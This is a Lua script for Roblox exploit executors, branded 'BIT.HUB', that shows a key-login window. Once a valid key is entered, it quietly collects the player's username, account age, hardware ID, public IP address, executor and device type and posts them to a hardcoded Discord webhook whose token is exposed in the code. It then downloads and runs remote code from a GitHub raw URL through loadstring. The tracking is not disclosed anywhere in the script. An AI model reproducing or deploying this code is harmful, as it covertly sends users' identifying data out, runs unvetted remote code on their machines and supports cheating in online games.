local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local player = Players.LocalPlayer

local keysUrl = "https://goo.su/ObNz7eZ"
local webhookUrl = "https://discord.com/api/webhooks/1344615325307768913/ia9QVQdIS9nrfpM5yqd5Af3ceQrBqGOWShgbdp1WjeTZbOXk0Oomol0rLP4k_b6JeOvH"
local ipUrl = "https://api64.ipify.org"

local function fetchKeys()
    local success, result = pcall(function()
        return game:HttpGet(keysUrl)
    end)
    if success then
        local keys = {}
        for key in string.gmatch(result, "[^\r\n]+") do
            table.insert(keys, key)
        end
        return keys
    else
        warn("error:", result)
        return {}
    end
end

local function getIPAddress()
    local success, result = pcall(function()
        return game:HttpGet(ipUrl)
    end)
    if success then
        return result
    else
        warn("failed to fetch IP:", result)
        return "unknown"
    end
end

local function getGameName()
    for i = 1, 3 do  
        local success, info = pcall(function()
            return MarketplaceService:GetProductInfo(game.PlaceId)
        end)
        if success and info then
            return info.Name
        end
        wait(1)
    end
    return "unknown"
end

local function getServerInfo()
    local playerGui = player:FindFirstChild("PlayerGui")
    if playerGui then
        local gameUI = playerGui:FindFirstChild("GameUI")
        if gameUI and gameUI:FindFirstChild("ServerInfo") and gameUI.ServerInfo:IsA("TextLabel") then
            return gameUI.ServerInfo.Text
        end
    end
    return "unknown"
end

local function getDeviceType()
    local deviceType = "unknown"
    if UserInputService.TouchEnabled then
        deviceType = "Mobile"
    elseif UserInputService.KeyboardEnabled then
        deviceType = "PC"
    end
    return deviceType
end

local function sendLog(keyUsed)
    local http = syn and syn.request or request
    local AnalyticsService = game:GetService("RbxAnalyticsService")

    local hwid = "unknown"
    local executor = "unknown"
    local ipAddress = getIPAddress()

    local success_hwid, result_hwid = pcall(function()
        return AnalyticsService:GetClientId()
    end)
    if success_hwid and result_hwid then
        hwid = result_hwid
    end

    local success_exec, result_exec = pcall(function()
        if getexecutorid then
            return getexecutorid()
        elseif identifyexecutor then
            return identifyexecutor()
        end
    end)
    if success_exec and result_exec then
        executor = result_exec
    end

    local username = player.Name
    local displayName = player.DisplayName  
    local userId = player.UserId
    local placeId = game.PlaceId
    local accountAge = player.AccountAge
    local gameName = getGameName()
    local serverInfo = getServerInfo()
    local deviceType = getDeviceType()

    local data = {
        ["content"] = "",
        ["embeds"] = {
            {
                ["title"] = "Player inject information",
                ["color"] = 8956648,
                ["image"] = {  
                    ["url"] = "https://cdn.discordapp.com/attachments/1340306508058984468/1340307808679231489/IMG_0374.gif?ex=67bc6e6b&is=67bb1ceb&hm=7827df2dd7406c4c3bef58122a6a1306fc17a4e4f13abff6e06debad77d2be30&"  
                },
                ["fields"] = {
                    { ["name"] = "Username", ["value"] = username, ["inline"] = true },
                    { ["name"] = "Display Name", ["value"] = displayName, ["inline"] = true },
                    { ["name"] = "Account Age", ["value"] = tostring(accountAge) .. " days", ["inline"] = false },
                    { ["name"] = "Game Name", ["value"] = gameName, ["inline"] = true },
                    { ["name"] = "PlaceID", ["value"] = tostring(placeId), ["inline"] = true },
                    { ["name"] = "Server Name", ["value"] = serverInfo, ["inline"] = false },
                    { ["name"] = "HWID", ["value"] = hwid, ["inline"] = false },
                    { ["name"] = "IP", ["value"] = ipAddress, ["inline"] = false },
                    { ["name"] = "Key", ["value"] = keyUsed, ["inline"] = false },
                    { ["name"] = "Executor", ["value"] = executor, ["inline"] = false },
                    { ["name"] = "Device", ["value"] = deviceType, ["inline"] = true }
                },
                ["footer"] = {
                    ["text"] = "BIT.HUB | Paid",
                    ["icon_url"] = "https://cdn.discordapp.com/attachments/1340306508058984468/1340307808679231489/IMG_0374.gif?ex=67bc6e6b&is=67bb1ceb&hm=7827df2dd7406c4c3bef58122a6a1306fc17a4e4f13abff6e06debad77d2be30&"
                }
            }
        }
    }

    http({
        Url = webhookUrl,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = HttpService:JSONEncode(data)
    })
end

local function isValidKey(inputKey)
    local validKeys = fetchKeys()
    for _, key in ipairs(validKeys) do
        if inputKey == key then
            return true
        end
    end
    return false
end

local screenGui = Instance.new("ScreenGui", game.Players.LocalPlayer.PlayerGui)
screenGui.Name = "KeyMenu"

local keyFrame = Instance.new("Frame", screenGui)
keyFrame.Size = UDim2.new(0, 320, 0, 180)
keyFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
keyFrame.AnchorPoint = Vector2.new(0.5, 0.5)
keyFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
keyFrame.BorderSizePixel = 0
keyFrame.Visible = false
keyFrame.ZIndex = 2

local frameShadow = Instance.new("ImageLabel", keyFrame)
frameShadow.AnchorPoint = Vector2.new(0.5, 0.5)
frameShadow.BackgroundTransparency = 1
frameShadow.BorderSizePixel = 0 
frameShadow.Image = "rbxassetid://7331400934"
frameShadow.ImageColor3 = Color3.fromRGB(0, 0, 5)
frameShadow.Name = "#shadow"
frameShadow.Position = UDim2.fromScale(0.5, 0.5)
frameShadow.ScaleType = "Slice"
frameShadow.Size = UDim2.new(1, 50, 1, 55)
frameShadow.SliceCenter = Rect.new(40, 40, 260, 260)
frameShadow.SliceScale = 1
frameShadow.ZIndex = 1

if not keyFrame:FindFirstChild("Gradient") then
    local gradient = Instance.new("UIGradient")
    gradient.Name = "Gradient"
    gradient.Parent = keyFrame
    gradient.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(73, 107, 117)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(35, 35, 35))   
    }
    gradient.Rotation = 90
end

local topLine = Instance.new("Frame", keyFrame)
topLine.Size = UDim2.new(1, 0, 0, 2)
topLine.Position = UDim2.new(0, 0, 0, 0)
topLine.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
topLine.BorderSizePixel = 0
topLine.ZIndex = 3

local bottomLine = Instance.new("Frame", keyFrame)
bottomLine.Size = UDim2.new(1, 0, 0, 2) 
bottomLine.Position = UDim2.new(0, 0, 1, -2) 
bottomLine.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
bottomLine.BorderSizePixel = 0
bottomLine.ZIndex = 3

local titleLabel = Instance.new("TextLabel", keyFrame)
titleLabel.Size = UDim2.new(1, 0, 0, 40)
titleLabel.Position = UDim2.new(0, 0, 0.05, 0)
titleLabel.Text = "BIT.HUB"
titleLabel.BackgroundTransparency = 1
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
titleLabel.Font = Enum.Font.Arcade
titleLabel.TextSize = 36
titleLabel.TextStrokeTransparency = 0.5
titleLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
titleLabel.ZIndex = 5

local textGradient = Instance.new("UIGradient", titleLabel)
textGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(150, 200, 255))
}
textGradient.Rotation = 90

local keyInput = Instance.new("TextBox", keyFrame)
keyInput.Size = UDim2.new(0.75, 0, 0, 30) 
keyInput.Position = UDim2.new(0.125, 0, 0.3, 0)
keyInput.PlaceholderText = "enter key"
keyInput.Text = getgenv().key or ""
keyInput.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
keyInput.TextColor3 = Color3.fromRGB(200, 200, 200)
keyInput.Font = Enum.Font.Arcade
keyInput.TextScaled = true
keyInput.BorderSizePixel = 0 
keyInput.ZIndex = 5

local keyCorner = Instance.new("UICorner", keyInput)
keyCorner.CornerRadius = UDim.new(0, 8)

local keyStroke = Instance.new("UIStroke", keyInput)
keyStroke.Thickness = 1
keyStroke.Color = Color3.fromRGB(203, 219, 215)
keyStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

local inputShadow = Instance.new("ImageLabel", keyInput)
inputShadow.AnchorPoint = Vector2.new(0.5, 0.5)
inputShadow.BackgroundTransparency = 1
inputShadow.BorderSizePixel = 0 
inputShadow.Image = "rbxassetid://7331400934"
inputShadow.ImageColor3 = Color3.fromRGB(0, 0, 5)
inputShadow.Name = "#shadow"
inputShadow.Position = UDim2.fromScale(0.5, 0.5)
inputShadow.ScaleType = "Slice"
inputShadow.Size = UDim2.new(1, 50, 1, 55)
inputShadow.SliceCenter = Rect.new(40, 40, 260, 260)
inputShadow.SliceScale = 1
inputShadow.ZIndex = 4

local checkKeyButton = Instance.new("TextButton", keyFrame)
checkKeyButton.Size = UDim2.new(0.55, 0, 0, 30) 
checkKeyButton.Position = UDim2.new(0.225, 0, 0.55, 0)
checkKeyButton.Text = "login"
checkKeyButton.BackgroundColor3 = Color3.fromRGB(110, 129, 148)
checkKeyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
checkKeyButton.Font = Enum.Font.Arcade
checkKeyButton.TextScaled = true
checkKeyButton.BorderSizePixel = 0
checkKeyButton.ZIndex = 5

local buttonCorner = Instance.new("UICorner", checkKeyButton)
buttonCorner.CornerRadius = UDim.new(0, 8)

local buttonStroke = Instance.new("UIStroke", checkKeyButton)
buttonStroke.Thickness = 1
buttonStroke.Color = Color3.fromRGB(203, 219, 215)
buttonStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

local buttonShadow = Instance.new("ImageLabel", checkKeyButton)
buttonShadow.AnchorPoint = Vector2.new(0.5, 0.5)
buttonShadow.BackgroundTransparency = 1
buttonShadow.BorderSizePixel = 0 
buttonShadow.Image = "rbxassetid://7331400934"
buttonShadow.ImageColor3 = Color3.fromRGB(0, 0, 5)
buttonShadow.Name = "#shadow"
buttonShadow.Position = UDim2.fromScale(0.5, 0.5)
buttonShadow.ScaleType = "Slice"
buttonShadow.Size = UDim2.new(1, 50, 1, 55)
buttonShadow.SliceCenter = Rect.new(40, 40, 260, 260)
buttonShadow.SliceScale = 1
buttonShadow.ZIndex = 4 

local errorMessage = Instance.new("TextLabel", keyFrame)
errorMessage.Size = UDim2.new(0.8, 0, 0, 25)
errorMessage.Position = UDim2.new(0.1, 0, 0.75, 0)
errorMessage.Text = ""
errorMessage.BackgroundTransparency = 1
errorMessage.TextColor3 = Color3.fromRGB(255, 255, 255)
errorMessage.Font = Enum.Font.Arcade
errorMessage.TextScaled = true
errorMessage.BorderSizePixel = 0 
errorMessage.ZIndex = 5 

local clickSound = Instance.new("Sound")
clickSound.SoundId = "rbxassetid://452267918" 
clickSound.Volume = 0.5
clickSound.Parent = keyFrame

local typeSound = Instance.new("Sound")
typeSound.SoundId = "rbxassetid://9116157309" 
typeSound.Volume = 1
typeSound.Parent = keyFrame

local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)

local function anim()
    keyFrame.Size = UDim2.new(0, 0, 0, 0)
    keyFrame.Visible = true
    local tween = TweenService:Create(keyFrame, tweenInfo, {Size = UDim2.new(0, 320, 0, 180)})
    tween:Play()
end

local function closeanim(callback)
    local tween = TweenService:Create(keyFrame, tweenInfo, {Size = UDim2.new(0, 0, 0, 0)})
    tween:Play()
    tween.Completed:Connect(function()
        keyFrame.Visible = false
        if callback then callback() end
    end)
end

local slideTweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)

local dragging
local dragInput
local dragStart
local startPos
local lastPosition
local velocity = Vector2.new(0, 0)

keyFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = keyFrame.Position
        lastPosition = input.Position
        clickSound:Play()
    end
end)

keyFrame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        dragInput = input
        if dragging then
            local currentPosition = input.Position
            velocity = (currentPosition - lastPosition) * 60
            lastPosition = currentPosition
        end
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        local delta = input.Position - dragStart
        keyFrame.Position = UDim2.new(
            startPos.X.Scale, startPos.X.Offset + delta.X,
            startPos.Y.Scale, startPos.Y.Offset + delta.Y
        )
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 and dragging then
        dragging = false
        local currentPos = keyFrame.Position
        local slideDistance = velocity * 0.1
        local targetPos = UDim2.new(
            currentPos.X.Scale, currentPos.X.Offset + slideDistance.X,
            currentPos.Y.Scale, currentPos.Y.Offset + slideDistance.Y
        )
        
        local slideTween = TweenService:Create(keyFrame, slideTweenInfo, {Position = targetPos})
        slideTween:Play()
    end
end)

keyInput:GetPropertyChangedSignal("Text"):Connect(function()
    if #keyInput.Text > 0 then
        typeSound:Play()
    end
end)

checkKeyButton.MouseEnter:Connect(function()
    TweenService:Create(checkKeyButton, TweenInfo.new(0.2), {
        BackgroundColor3 = Color3.fromRGB(130, 149, 168)
    }):Play()
end)

checkKeyButton.MouseLeave:Connect(function()
    TweenService:Create(checkKeyButton, TweenInfo.new(0.2), {
        BackgroundColor3 = Color3.fromRGB(110, 129, 148)
    }):Play()
end)

checkKeyButton.MouseButton1Click:Connect(function()
    clickSound:Play()
    local userInputKey = keyInput.Text

    if isValidKey(userInputKey) then
        closeanim(function()
            screenGui:Destroy()
            sendLog(userInputKey)

            local success, errorMessage = pcall(function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/aladin667/phtlox/refs/heads/main/mvb.lua", true))()
            end)

            if not success then
                warn("error loading script:", errorMessage)
            end
        end)
    else
        errorMessage.Text = "Invalid key"
        wait(1)
        errorMessage.Text = "Try again"
        wait(1)
        errorMessage.Text = ""
    end
end)

anim()
